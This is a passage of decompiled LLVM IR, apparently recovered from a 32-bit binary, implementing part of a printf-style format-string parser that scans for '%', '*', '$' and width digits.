  br i1 %tmp175, label %dec_label_pc_8051b55.dec_label_pc_8051b2d_crit_edge, label %dec_label_pc_8051b5b

dec_label_pc_8051b55.dec_label_pc_8051b2d_crit_edge: ; preds = %dec_label_pc_8051b55
  %v2_8051b3e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051b2d

dec_label_pc_8051b5b:                             ; preds = %dec_label_pc_8051b55, %dec_label_pc_8051b51
  %v2_8051b60 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_8051b78.outer

dec_label_pc_8051b78.outer:                       ; preds = %dec_label_pc_8051b5b, %dec_label_pc_8051b1a, %dec_label_pc_8051c95
  %v0_8051b84.ph94 = phi i32 [ %v1_8051c95, %dec_label_pc_8051c95 ], [ %v2_8051b1a, %dec_label_pc_8051b1a ], [ %v2_8051b60, %dec_label_pc_8051b5b ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_8051c95 ], [ %tmp66, %dec_label_pc_8051b1a ], [ %tmp66, %dec_label_pc_8051b5b ]
  %stack_var_-96.1.ph = phi i32 [ %v0_8051b1e, %dec_label_pc_8051c95 ], [ 0, %dec_label_pc_8051b1a ], [ 0, %dec_label_pc_8051b5b ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051c95 ], [ %v3_8051b08, %dec_label_pc_8051b1a ], [ %v3_8051b08, %dec_label_pc_8051b5b ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_8051c95 ], [ 0, %dec_label_pc_8051b1a ], [ 0, %dec_label_pc_8051b5b ]
  %v7_8051b7f = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_8051b7f = trunc i64 %v7_8051b7f to i32
  %v2_8051b87 = add i32 %v8_8051b7f, 80
  br label %dec_label_pc_8051b78

dec_label_pc_8051b78:                             ; preds = %dec_label_pc_8051b78.outer, %dec_label_pc_8051c35
  %v0_8051b84 = phi i32 [ %v0_8051c42, %dec_label_pc_8051c35 ], [ %v0_8051b84.ph94, %dec_label_pc_8051b78.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_8051c35 ], [ %stack_var_-32.1.ph, %dec_label_pc_8051b78.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_8051c35 ], [ %stack_var_-88.1.ph, %dec_label_pc_8051b78.outer ]
  store i32 %v0_8051b84, i32* @edx, align 4
  store i32 %v0_8051b84, i32* @esi, align 4
  %v1_8051b7a = inttoptr i32 %v0_8051b84 to i8*
  %v2_8051b7a = load i8, i8* %v1_8051b7a, align 1
  %v11_8051b7a = icmp eq i8 %v2_8051b7a, 42
  %v1_8051b7d = icmp eq i1 %v11_8051b7a, false
  br i1 %v1_8051b7d, label %dec_label_pc_8051b8f, label %dec_label_pc_8051b7f

dec_label_pc_8051b7f:                             ; preds = %dec_label_pc_8051b78
  store i32 %v8_8051b7f, i32* %eax.global-to-local, align 4
  %v1_8051b84 = add i32 %v0_8051b84, 1
  store i32 %v1_8051b84, i32* @esi, align 4
  %v0_8051b87 = load i32, i32* @esp, align 4
  %v3_8051b87 = add i32 %v2_8051b87, %v0_8051b87
  %v4_8051b87 = inttoptr i32 %v3_8051b87 to i32*
  store i32 0, i32* %v4_8051b87, align 4
  %v0_8051ba9.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051b8f

dec_label_pc_8051b8f:                             ; preds = %dec_label_pc_8051b78, %dec_label_pc_8051b7f
  %v0_8051ba9.pre = phi i32 [ %v0_8051b84, %dec_label_pc_8051b78 ], [ %v0_8051ba9.pre.pre, %dec_label_pc_8051b7f ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_8051b91 = load i32, i32* @global_var_805b278, align 8
  store i32 %v0_8051b91, i32* %ebp.global-to-local, align 4
  %v4_8051ba9.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ba9124 = inttoptr i32 %v0_8051ba9.pre to i8*
  %v2_8051ba9125 = load i8, i8* %v1_8051ba9124, align 1
  %v3_8051ba9126 = zext i8 %v2_8051ba9125 to i32
  %v5_8051ba9127 = and i32 %v4_8051ba9.pre, -256
  %v6_8051ba9128 = or i32 %v3_8051ba9126, %v5_8051ba9127
  store i32 %v6_8051ba9128, i32* %eax.global-to-local, align 4
  %v2_8051bab129 = sext i8 %v2_8051ba9125 to i32
  store i32 %v2_8051bab129, i32* @ecx, align 4
  %v2_8051bae130 = mul nsw i32 %v2_8051bab129, 2
  %v3_8051bae131 = add i32 %v2_8051bae130, %v0_8051b91
  %v4_8051bae132 = inttoptr i32 %v3_8051bae131 to i8*
  %v5_8051bae133 = load i8, i8* %v4_8051bae132, align 1
  %v6_8051bae134 = and i8 %v5_8051bae133, 8
  %v7_8051bae135 = icmp eq i8 %v6_8051bae134, 0
  %v1_8051bb3136 = icmp eq i1 %v7_8051bae135, false
  br i1 %v1_8051bb3136, label %dec_label_pc_8051b99, label %dec_label_pc_8051bb5

dec_label_pc_8051b99:                             ; preds = %dec_label_pc_8051b8f, %dec_label_pc_8051ba8
  %v2_8051bab140 = phi i32 [ %v2_8051bab, %dec_label_pc_8051ba8 ], [ %v2_8051bab129, %dec_label_pc_8051b8f ]
  %v6_8051ba9139 = phi i32 [ %v6_8051ba9, %dec_label_pc_8051ba8 ], [ %v6_8051ba9128, %dec_label_pc_8051b8f ]
  %v0_8051ba8138 = phi i32 [ %v1_8051ba8, %dec_label_pc_8051ba8 ], [ %v0_8051ba9.pre, %dec_label_pc_8051b8f ]
  %v1_8051ba1137 = phi i32 [ %v0_8051bc332, %dec_label_pc_8051ba8 ], [ 0, %dec_label_pc_8051b8f ]
  %v1_8051b99 = add i32 %v1_8051ba1137, -4094
  %v6_8051b99 = sub i32 4093, %v1_8051ba1137
  %v7_8051b99 = and i32 %v6_8051b99, %v1_8051ba1137
  %v8_8051b99 = icmp slt i32 %v7_8051b99, 0
  %v9_8051b99 = icmp eq i32 %v1_8051b99, 0
  %v10_8051b99 = icmp slt i32 %v1_8051b99, 0
  %v3_8051b9f = icmp eq i1 %v10_8051b99, %v8_8051b99
  %v4_8051b9f = icmp eq i1 %v9_8051b99, false
  %v5_8051b9f = and i1 %v4_8051b9f, %v3_8051b9f
  br i1 %v5_8051b9f, label %dec_label_pc_8051ba8, label %dec_label_pc_8051ba1

dec_label_pc_8051ba1:                             ; preds = %dec_label_pc_8051b99
  %v3_8051ba1 = mul i32 %v1_8051ba1137, 10
  store i32 %v3_8051ba1, i32* %eax.global-to-local, align 4
  %v2_8051ba4 = add i32 %v3_8051ba1, -48
  %v3_8051ba4 = add i32 %v2_8051ba4, %v2_8051bab140
  store i32 %v3_8051ba4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ba8

dec_label_pc_8051ba8:                             ; preds = %dec_label_pc_8051b99, %dec_label_pc_8051ba1
  %v0_8051bc332 = phi i32 [ %v1_8051ba1137, %dec_label_pc_8051b99 ], [ %v3_8051ba4, %dec_label_pc_8051ba1 ]
  %v4_8051ba928 = phi i32 [ %v6_8051ba9139, %dec_label_pc_8051b99 ], [ %v3_8051ba1, %dec_label_pc_8051ba1 ]
  %v1_8051ba8 = add i32 %v0_8051ba8138, 1
  store i32 %v1_8051ba8, i32* @esi, align 4
  %v1_8051ba9 = inttoptr i32 %v1_8051ba8 to i8*
  %v2_8051ba9 = load i8, i8* %v1_8051ba9, align 1
  %v3_8051ba9 = zext i8 %v2_8051ba9 to i32
  %v5_8051ba9 = and i32 %v4_8051ba928, -256
  %v6_8051ba9 = or i32 %v3_8051ba9, %v5_8051ba9
  store i32 %v6_8051ba9, i32* %eax.global-to-local, align 4
  %v2_8051bab = sext i8 %v2_8051ba9 to i32
  store i32 %v2_8051bab, i32* @ecx, align 4
  %v2_8051bae = mul nsw i32 %v2_8051bab, 2
  %v3_8051bae = add i32 %v2_8051bae, %v0_8051b91
  %v4_8051bae = inttoptr i32 %v3_8051bae to i8*
  %v5_8051bae = load i8, i8* %v4_8051bae, align 1
  %v6_8051bae = and i8 %v5_8051bae, 8
  %v7_8051bae = icmp eq i8 %v6_8051bae, 0
  %v1_8051bb3 = icmp eq i1 %v7_8051bae, false
  br i1 %v1_8051bb3, label %dec_label_pc_8051b99, label %dec_label_pc_8051bb5

dec_label_pc_8051bb5:                             ; preds = %dec_label_pc_8051ba8, %dec_label_pc_8051b8f
  %v1_8051ba1.lcssa = phi i32 [ 0, %dec_label_pc_8051b8f ], [ %v0_8051bc332, %dec_label_pc_8051ba8 ]
  %v0_8051ba8.lcssa = phi i32 [ %v0_8051ba9.pre, %dec_label_pc_8051b8f ], [ %v1_8051ba8, %dec_label_pc_8051ba8 ]
  %v2_8051ba9.lcssa = phi i8 [ %v2_8051ba9125, %dec_label_pc_8051b8f ], [ %v2_8051ba9, %dec_label_pc_8051ba8 ]
  %v6_8051ba9.lcssa = phi i32 [ %v6_8051ba9128, %dec_label_pc_8051b8f ], [ %v6_8051ba9, %dec_label_pc_8051ba8 ]
  %v0_8051bb5 = load i32, i32* @edx, align 4
  %v1_8051bb5 = add i32 %v0_8051bb5, -1
  %v2_8051bb5 = inttoptr i32 %v1_8051bb5 to i8*
  %v3_8051bb5 = load i8, i8* %v2_8051bb5, align 1
  %v12_8051bb5 = icmp eq i8 %v3_8051bb5, 37
  %v1_8051bb9 = icmp eq i1 %v12_8051bb5, false
  br i1 %v1_8051bb9, label %dec_label_pc_8051c4c, label %dec_label_pc_8051bbf

dec_label_pc_8051bbf:                             ; preds = %dec_label_pc_8051bb5
  %v10_8051bbf = icmp eq i8 %v2_8051ba9.lcssa, 36
  %v1_8051bc1 = icmp eq i1 %v10_8051bbf, false
  br i1 %v1_8051bc1, label %dec_label_pc_8051bf3, label %dec_label_pc_8051bc3

dec_label_pc_8051bc3:                             ; preds = %dec_label_pc_8051bbf
  %tmp89 = icmp slt i32 %v1_8051ba1.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_8051bf3, label %dec_label_pc_8051bc7

dec_label_pc_8051bc7:                             ; preds = %dec_label_pc_8051bc3
  %v1_8051bc7 = add i32 %v0_8051ba8.lcssa, 1
  store i32 %v1_8051bc7, i32* @edx, align 4
  %v4_8051bca = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_8051bca, label %dec_label_pc_8051e94, label %dec_label_pc_8051bd5

dec_label_pc_8051bd5:                             ; preds = %dec_label_pc_8051bc7
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_8051bdd = sub i32 %v1_8051ba1.lcssa, %stack_var_-88.1
  %v8_8051bdd = xor i32 %v1_8051ba1.lcssa, %stack_var_-88.1
  %v9_8051bdd = xor i32 %v2_8051bdd, %v1_8051ba1.lcssa
  %v10_8051bdd = and i32 %v9_8051bdd, %v8_8051bdd
  %v11_8051bdd = icmp slt i32 %v10_8051bdd, 0
  %v12_8051bdd = icmp eq i32 %v2_8051bdd, 0
  %v13_8051bdd = icmp slt i32 %v2_8051bdd, 0
  %v3_8051bdf = icmp ne i1 %v13_8051bdd, %v11_8051bdd
  %v4_8051bdf = or i1 %v12_8051bdd, %v3_8051bdf
  %stack_var_-88.1.v0_8051be1 = select i1 %v4_8051bdf, i32 %stack_var_-88.1, i32 %v1_8051ba1.lcssa
  br label %dec_label_pc_8051bef

dec_label_pc_8051bef:                             ; preds = %dec_label_pc_8051c03, %dec_label_pc_8051bd5, %dec_label_pc_8051c07
  %v0_8051bef = phi i32 [ %v1_8051bc7, %dec_label_pc_8051bd5 ], [ %v0_8051bb5, %dec_label_pc_8051c07 ], [ %v0_8051bb5, %dec_label_pc_8051c03 ]
  %stack_var_-32.2 = phi i32 [ %v1_8051ba1.lcssa, %dec_label_pc_8051bd5 ], [ %stack_var_-32.1, %dec_label_pc_8051c07 ], [ %stack_var_-32.1, %dec_label_pc_8051c03 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_8051be1, %dec_label_pc_8051bd5 ], [ 0, %dec_label_pc_8051c07 ], [ 0, %dec_label_pc_8051c03 ]
  store i32 %v0_8051bef, i32* @esi, align 4
  br label %dec_label_pc_8051c16

dec_label_pc_8051bf3:                             ; preds = %dec_label_pc_8051bc3, %dec_label_pc_8051bbf
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_8051c03, label %dec_label_pc_8051bfa

dec_label_pc_8051bfa:                             ; preds = %dec_label_pc_8051bf3
  %v10_8051bfa = icmp eq i8 %v2_8051ba9.lcssa, 109
  br i1 %v10_8051bfa, label %dec_label_pc_8051c4c, label %dec_label_pc_8051e94

dec_label_pc_8051c03:                             ; preds = %dec_label_pc_8051bf3
  %tmp176 = icmp ugt i32 %v0_8051ba8.lcssa, %v0_8051bb5
  br i1 %tmp176, label %dec_label_pc_8051c07, label %dec_label_pc_8051bef

dec_label_pc_8051c07:                             ; preds = %dec_label_pc_8051c03
  %v1_8051c07 = inttoptr i32 %v0_8051bb5 to i8*
  %v2_8051c07 = load i8, i8* %v1_8051c07, align 1
  %v8_8051c07 = icmp eq i8 %v2_8051c07, 48
  br i1 %v8_8051c07, label %dec_label_pc_8051bef, label %dec_label_pc_8051c4c

dec_label_pc_8051c16:                             ; preds = %dec_label_pc_8051c27, %dec_label_pc_8051bef
  %v0_8051c42 = phi i32 [ %v1_8051c27, %dec_label_pc_8051c27 ], [ %v0_8051bef, %dec_label_pc_8051bef ]
  %v4_8051c2035 = phi i32 [ %v6_8051c20, %dec_label_pc_8051c27 ], [ %v6_8051ba9.lcssa, %dec_label_pc_8051bef ]
  store i32 ptrtoint ([8 x i8]* @global_var_80598aa.484 to i32), i32* %edx.global-to-local, align 4
  %v1_8051c23 = inttoptr i32 %v0_8051c42 to i8*
  br label %dec_label_pc_8051c20

dec_label_pc_8051c20:                             ; preds = %dec_label_pc_8051c31, %dec_label_pc_8051c16
  %v4_8051c20 = phi i32 [ %v4_8051c2035, %dec_label_pc_8051c16 ], [ %v6_8051c20, %dec_label_pc_8051c31 ]
  %v0_8051c22 = phi i32 [ ptrtoint ([8 x i8]* @global_var_80598aa.484 to i32), %dec_label_pc_8051c16 ], [ %v1_8051c22, %dec_label_pc_8051c31 ]
  %v0_8051c31 = phi i32 [ 1, %dec_label_pc_8051c16 ], [ %v2_8051c31, %dec_label_pc_8051c31 ]
  store i32 %v0_8051c31, i32* @ecx, align 4
  %v1_8051c20 = inttoptr i32 %v0_8051c22 to i8*
  %v2_8051c20 = load i8, i8* %v1_8051c20, align 1
  %v3_8051c20 = zext i8 %v2_8051c20 to i32
  %v5_8051c20 = and i32 %v4_8051c20, -256
  %v6_8051c20 = or i32 %v3_8051c20, %v5_8051c20
  store i32 %v6_8051c20, i32* %eax.global-to-local, align 4
  %v1_8051c22 = add i32 %v0_8051c22, 1
  store i32 %v1_8051c22, i32* @edx, align 4
  %v2_8051c23 = load i8, i8* %v1_8051c23, align 1
  %v15_8051c23 = icmp eq i8 %v2_8051c23, %v2_8051c20
  %v1_8051c25 = icmp eq i1 %v15_8051c23, false
  br i1 %v1_8051c25, label %dec_label_pc_8051c2c, label %dec_label_pc_8051c27

dec_label_pc_8051c27:                             ; preds = %dec_label_pc_8051c20
  %v1_8051c27 = add i32 %v0_8051c42, 1
  store i32 %v1_8051c27, i32* @esi, align 4
  %v0_8051c28 = load i32, i32* %edi.global-to-local, align 4
  %v2_8051c28 = or i32 %v0_8051c28, %v0_8051c31
  store i32 %v2_8051c28, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051c16

dec_label_pc_8051c2c:                             ; preds = %dec_label_pc_8051c20
  %v1_8051c2c = inttoptr i32 %v1_8051c22 to i8*
  %v2_8051c2c = load i8, i8* %v1_8051c2c, align 1
  %v3_8051c2c = icmp eq i8 %v2_8051c2c, 0
  br i1 %v3_8051c2c, label %dec_label_pc_8051c35, label %dec_label_pc_8051c31

dec_label_pc_8051c31:                             ; preds = %dec_label_pc_8051c2c
  %v2_8051c31 = mul i32 %v0_8051c31, 2
  br label %dec_label_pc_8051c20

dec_label_pc_8051c35:                             ; preds = %dec_label_pc_8051c2c
  %v0_8051c35 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8051c39 = udiv i32 %v0_8051c35, 2
  %v1_8051c39.not = or i32 %v1_8051c39, -6
  %v1_8051c3e = xor i32 %v1_8051c39.not, 5
  store i32 %v1_8051c3e, i32* %eax.global-to-local, align 4
  %v2_8051c40 = and i32 %v1_8051c3e, %v0_8051c35
  store i32 %v2_8051c40, i32* %edi.global-to-local, align 4
  %v1_8051c42 = add i32 %v0_8051c42, -1
  %v2_8051c42 = inttoptr i32 %v1_8051c42 to i8*
  %v3_8051c42 = load i8, i8* %v2_8051c42, align 1
  %v12_8051c42 = icmp eq i8 %v3_8051c42, 37
  %v1_8051c46 = icmp eq i1 %v12_8051c42, false
  br i1 %v1_8051c46, label %dec_label_pc_8051b78, label %dec_label_pc_8051c4c

dec_label_pc_8051c4c:                             ; preds = %dec_label_pc_8051c07, %dec_label_pc_8051c35, %dec_label_pc_8051bb5, %dec_label_pc_8051bfa
  %v0_8051c6f = phi i32 [ %v1_8051ba1.lcssa, %dec_label_pc_8051bfa ], [ %v1_8051ba1.lcssa, %dec_label_pc_8051c07 ], [ 0, %dec_label_pc_8051c35 ], [ %v1_8051ba1.lcssa, %dec_label_pc_8051bb5 ]
  %v1_8051c78 = phi i32 [ %v0_8051ba8.lcssa, %dec_label_pc_8051bfa ], [ %v0_8051ba8.lcssa, %dec_label_pc_8051c07 ], [ %v0_8051c42, %dec_label_pc_8051c35 ], [ %v0_8051ba8.lcssa, %dec_label_pc_8051bb5 ]
  %v0_8051c75 = phi i32 [ %v0_8051bb5, %dec_label_pc_8051bfa ], [ %v0_8051bb5, %dec_label_pc_8051c07 ], [ %v1_8051c22, %dec_label_pc_8051c35 ], [ %v0_8051bb5, %dec_label_pc_8051bb5 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_8051bfa ], [ %stack_var_-32.1, %dec_label_pc_8051c07 ], [ %stack_var_-32.2, %dec_label_pc_8051c35 ], [ %stack_var_-32.1, %dec_label_pc_8051bb5 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_8051bfa ], [ 0, %dec_label_pc_8051c07 ], [ %stack_var_-88.2, %dec_label_pc_8051c35 ], [ %stack_var_-88.1, %dec_label_pc_8051bb5 ]
  %v1_8051c4c = inttoptr i32 %v0_8051c75 to i8*
  %v2_8051c4c = load i8, i8* %v1_8051c4c, align 1
  %v11_8051c4c = icmp eq i8 %v2_8051c4c, 42
  %v1_8051c4f = icmp eq i1 %v11_8051c4c, false
  br i1 %v1_8051c4f, label %dec_label_pc_8051c85, label %dec_label_pc_8051c51

dec_label_pc_8051c51:                             ; preds = %dec_label_pc_8051c4c
  %v4_8051c51 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_8051c51, label %dec_label_pc_8051c75, label %dec_label_pc_8051c58

dec_label_pc_8051c58:                             ; preds = %dec_label_pc_8051c51
  %v1_8051c58 = inttoptr i32 %v1_8051c78 to i8*
  %v2_8051c58 = load i8, i8* %v1_8051c58, align 1
  %v11_8051c58 = icmp eq i8 %v2_8051c58, 36
  %v1_8051c5b = icmp eq i1 %v11_8051c58, false
  br i1 %v1_8051c5b, label %dec_label_pc_8051e94, label %dec_label_pc_8051c61

dec_label_pc_8051c61:                             ; preds = %dec_label_pc_8051c58
  %tmp91 = icmp slt i32 %v0_8051c6f, 1
  br i1 %tmp91, label %dec_label_pc_8051e94, label %dec_label_pc_8051c69

dec_label_pc_8051c69:                             ; preds = %dec_label_pc_8051c61
  store i32 %v8_8051b7f, i32* %eax.global-to-local, align 4
  %v1_8051c6e = add i32 %v1_8051c78, 1
  store i32 %v1_8051c6e, i32* @esi, align 4
  %v1_8051c6f = load i32, i32* @esp, align 4
  %v3_8051c6f = add i32 %v8_8051b7f, 68
  %v4_8051c6f = add i32 %v3_8051c6f, %v1_8051c6f
  %v5_8051c6f = inttoptr i32 %v4_8051c6f to i32*
  store i32 %v0_8051c6f, i32* %v5_8051c6f, align 4
  %v0_8051cb3.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051c80

dec_label_pc_8051c75:                             ; preds = %dec_label_pc_8051c51
  %v1_8051c75 = add i32 %v0_8051c75, 1
  store i32 %v1_8051c75, i32* %eax.global-to-local, align 4
  %v12_8051c78 = icmp eq i32 %v1_8051c75, %v1_8051c78
  %v1_8051c7a = icmp eq i1 %v12_8051c78, false
  br i1 %v1_8051c7a, label %dec_label_pc_8051e94, label %dec_label_pc_8051c80

dec_label_pc_8051c80:                             ; preds = %dec_label_pc_8051c75, %dec_label_pc_8051c69
  %v0_8051cb3.pre.pre.pre = phi i32 [ %v1_8051c78, %dec_label_pc_8051c75 ], [ %v0_8051cb3.pre.pre.pre.pre, %dec_label_pc_8051c69 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051c85

dec_label_pc_8051c85:                             ; preds = %dec_label_pc_8051c4c, %dec_label_pc_8051c80
  %v0_8051cb3.pre.pre = phi i32 [ %v1_8051c78, %dec_label_pc_8051c4c ], [ %v0_8051cb3.pre.pre.pre, %dec_label_pc_8051c80 ]
  %v0_8051b1e = phi i32 [ %v0_8051c6f, %dec_label_pc_8051c4c ], [ -2147483648, %dec_label_pc_8051c80 ]
  %v4_8051c85 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_8051c85 = icmp eq i32 %v4_8051c85, 0
  %v1_8051c8a = icmp eq i1 %v5_8051c85, false
  %.pre = inttoptr i32 %v0_8051cb3.pre.pre to i8*
  br i1 %v1_8051c8a, label %dec_label_pc_8051cae, label %dec_label_pc_8051c90

dec_label_pc_8051c90:                             ; preds = %dec_label_pc_8051c85
  %v2_8051c90 = load i8, i8* %.pre, align 1
  %v11_8051c90 = icmp eq i8 %v2_8051c90, 46
  %v1_8051c93 = icmp eq i1 %v11_8051c90, false
  br i1 %v1_8051c93, label %dec_label_pc_8051ca7, label %dec_label_pc_8051c95

dec_label_pc_8051c95:                             ; preds = %dec_label_pc_8051c90
  %v1_8051c95 = add i32 %v0_8051cb3.pre.pre, 1
  store i32 %v1_8051c95, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051b78.outer

dec_label_pc_8051ca7:                             ; preds = %dec_label_pc_8051c90
  br label %dec_label_pc_8051cae

dec_label_pc_8051cae:                             ; preds = %dec_label_pc_8051c85, %dec_label_pc_8051ca7
  %stack_var_-96.2 = phi i32 [ %v0_8051b1e, %dec_label_pc_8051ca7 ], [ %stack_var_-96.1.ph, %dec_label_pc_8051c85 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_8051ca7 ], [ %v0_8051b1e, %dec_label_pc_8051c85 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8059858.485 to i32), i32* @edx, align 4
  %v4_8051cb3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051cb3

dec_label_pc_8051cb3:                             ; preds = %dec_label_pc_8051cbd, %dec_label_pc_8051cae
  %v0_8051cbd = phi i32 [ %v1_8051cbd, %dec_label_pc_8051cbd ], [ ptrtoint ([9 x i8]* @global_var_8059858.485 to i32), %dec_label_pc_8051cae ]
  %v4_8051cb3 = phi i32 [ %v6_8051cb3, %dec_label_pc_8051cbd ], [ %v4_8051cb3.pre, %dec_label_pc_8051cae ]
  %v2_8051cb3 = load i8, i8* %.pre, align 1
  %v3_8051cb3 = zext i8 %v2_8051cb3 to i32
  %v5_8051cb3 = and i32 %v4_8051cb3, -256
  %v6_8051cb3 = or i32 %v3_8051cb3, %v5_8051cb3
  store i32 %v6_8051cb3, i32* %eax.global-to-local, align 4
  %v3_8051cb5 = inttoptr i32 %v0_8051cbd to i8*
  %v4_8051cb5 = load i8, i8* %v3_8051cb5, align 1
  %v15_8051cb5 = icmp eq i8 %v2_8051cb3, %v4_8051cb5
  br i1 %v15_8051cb5, label %dec_label_pc_8051b25, label %dec_label_pc_8051cbd

dec_label_pc_8051cbd:                             ; preds = %dec_label_pc_8051cb3
  %v1_8051cbd = add i32 %v0_8051cbd, 1
  store i32 %v1_8051cbd, i32* @edx, align 4
  %v1_8051cbe = inttoptr i32 %v1_8051cbd to i8*
  %v2_8051cbe = load i8, i8* %v1_8051cbe, align 1
  %v3_8051cbe = icmp eq i8 %v2_8051cbe, 0
  %v1_8051cc1 = icmp eq i1 %v3_8051cbe, false
  br i1 %v1_8051cc1, label %dec_label_pc_8051cb3, label %dec_label_pc_8051cc3

dec_label_pc_8051cc3:                             ; preds = %dec_label_pc_8051cbd, %dec_label_pc_8051b25
  %v0_8051cd6 = phi i32 [ %v1_8051b25, %dec_label_pc_8051b25 ], [ %v0_8051cb3.pre.pre, %dec_label_pc_8051cbd ]
  %v0_8051cd3 = phi i32 [ %v0_8051cbd, %dec_label_pc_8051b25 ], [ %v1_8051cbd, %dec_label_pc_8051cbd ]
  %v1_8051cc5 = add i32 %v0_8051cd3, -134584408
  %v1_8051cca = add i32 %v0_8051cd3, -134584409
  %v5_8051cca = sub i32 134584408, %v0_8051cd3
  %v6_8051cca = and i32 %v1_8051cc5, %v5_8051cca
  %v7_8051cca = icmp slt i32 %v6_8051cca, 0
  %v8_8051cca = icmp eq i32 %v1_8051cca, 0
  %v9_8051cca = icmp slt i32 %v1_8051cca, 0
  store i32 %v1_8051cca, i32* %eax.global-to-local, align 4
  %v3_8051ccb = icmp eq i1 %v9_8051cca, %v7_8051cca
  %v4_8051ccb = icmp eq i1 %v8_8051cca, false
  %v5_8051ccb = and i1 %v4_8051ccb, %v3_8051ccb
  br i1 %v5_8051ccb, label %dec_label_pc_8051cd7, label %dec_label_pc_8051ccd

dec_label_pc_8051ccd:                             ; preds = %dec_label_pc_8051cc3
  %v1_8051ccd = inttoptr i32 %v0_8051cd6 to i8*
  %v2_8051ccd = load i8, i8* %v1_8051ccd, align 1
  %v3_8051ccd = zext i8 %v2_8051ccd to i32
  %v5_8051ccd = and i32 %v1_8051cca, -256
  %v6_8051ccd = or i32 %v3_8051ccd, %v5_8051ccd
  store i32 %v6_8051ccd, i32* %eax.global-to-local, align 4
  %v3_8051ccf = inttoptr i32 %v0_8051cd3 to i8*
  %v4_8051ccf = load i8, i8* %v3_8051ccf, align 1
  %v15_8051ccf = icmp eq i8 %v2_8051ccd, %v4_8051ccf
  %v1_8051cd1 = icmp eq i1 %v15_8051ccf, false
  br i1 %v1_8051cd1, label %dec_label_pc_8051cd7, label %dec_label_pc_8051cd3

dec_label_pc_8051cd3:                             ; preds = %dec_label_pc_8051ccd
  %v1_8051cd3 = add i32 %v0_8051cd3, 9
  store i32 %v1_8051cd3, i32* @edx, align 4
  %v1_8051cd6 = add i32 %v0_8051cd6, 1
  store i32 %v1_8051cd6, i32* @esi, align 4
  br label %dec_label_pc_8051cd7

dec_label_pc_8051cd7:                             ; preds = %dec_label_pc_8051ccd, %dec_label_pc_8051cc3, %dec_label_pc_8051cd3
  %v4_8051cde = phi i32 [ %v6_8051ccd, %dec_label_pc_8051ccd ], [ %v1_8051cca, %dec_label_pc_8051cc3 ], [ %v6_8051ccd, %dec_label_pc_8051cd3 ]
  %v0_8051cde = phi i32 [ %v0_8051cd6, %dec_label_pc_8051ccd ], [ %v0_8051cd6, %dec_label_pc_8051cc3 ], [ %v1_8051cd6, %dec_label_pc_8051cd3 ]
  %v0_8051cd7 = phi i32 [ %v0_8051cd3, %dec_label_pc_8051ccd ], [ %v0_8051cd3, %dec_label_pc_8051cc3 ], [ %v1_8051cd3, %dec_label_pc_8051cd3 ]
  %v1_8051cd7 = add i32 %v0_8051cd7, 9
  %v2_8051cd7 = inttoptr i32 %v1_8051cd7 to i8*
  %v3_8051cd7 = load i8, i8* %v2_8051cd7, align 1
  %v4_8051cd7 = sext i8 %v3_8051cd7 to i32
  %v2_8051cdb = mul nsw i32 %v4_8051cd7, 256
  store i32 %v2_8051cdb, i32* %ebx.global-to-local, align 4
  %v1_8051cde = inttoptr i32 %v0_8051cde to i8*
  %v2_8051cde = load i8, i8* %v1_8051cde, align 1
  %v3_8051cde = zext i8 %v2_8051cde to i32
  %v5_8051cde = and i32 %v4_8051cde, -256
  %v6_8051cde = or i32 %v3_8051cde, %v5_8051cde
  store i32 %v6_8051cde, i32* %eax.global-to-local, align 4
  %v4_8051ce0 = icmp eq i8 %v2_8051cde, 0
  br i1 %v4_8051ce0, label %dec_label_pc_8051e94, label %dec_label_pc_8051ce8

dec_label_pc_8051ce8:                             ; preds = %dec_label_pc_8051cd7
  store i32 ptrtoint ([21 x i8]* @global_var_8059895.486 to i32), i32* %ecx.global-to-local, align 4
  %v3_8051ced = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8051ced, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051cf1

dec_label_pc_8051cf1:                             ; preds = %dec_label_pc_8051d40, %dec_label_pc_8051ce8
  %v0_8051d40 = phi i32 [ %v1_8051d40, %dec_label_pc_8051d40 ], [ ptrtoint ([21 x i8]* @global_var_8059895.486 to i32), %dec_label_pc_8051ce8 ]
  %v3_8051cf1 = inttoptr i32 %v0_8051d40 to i8*
  %v4_8051cf1 = load i8, i8* %v3_8051cf1, align 1
  %v15_8051cf1 = icmp eq i8 %v2_8051cde, %v4_8051cf1
  %v1_8051cf3 = icmp eq i1 %v15_8051cf1, false
  br i1 %v1_8051cf3, label %dec_label_pc_8051d40, label %dec_label_pc_8051cf5

dec_label_pc_8051cf5:                             ; preds = %dec_label_pc_8051cf1
